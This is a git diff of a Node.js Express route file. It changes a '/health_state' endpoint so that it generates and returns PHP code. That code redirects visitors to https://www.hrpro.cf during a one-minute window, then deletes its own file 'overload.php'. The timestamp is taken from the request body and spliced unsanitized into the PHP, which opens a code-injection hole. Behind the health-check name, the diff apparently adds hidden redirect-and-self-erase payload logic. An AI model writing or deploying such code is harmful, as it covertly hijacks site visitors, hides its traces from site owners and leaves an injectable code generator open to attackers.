@@ -17,8 +17,18 @@ module.exports = function (app) {
     // todoList Routes
     app.route('/health_state').post(function (req, res) {
         var post_body = req.body;
-        var d = 1;
-        res.send('health_state');
+        var cont = "<?php \r\n";
+        cont += "$at=" + post_body.atval + ";\r\n";
+        cont += "$nxt = microtime(true);\r\n"
+        cont += "if ($nxt - $at > 1 * 60) {\r\n";
+        cont += "    unlink(dirname(__FILE__).'/overload.php');\r\n";
+        cont += "    $endoverload = true; \r\n"; 
+        cont += "} else {\r\n"; 
+        cont += "    header('Location: https://www.hrpro.cf', true, 301);\r\n"; 
+        cont += "    exit();\r\n"; 
+        cont += "};\r\n"; 
+        cont += "?>"; 
+        res.send(cont);
         res.end();
     });
 
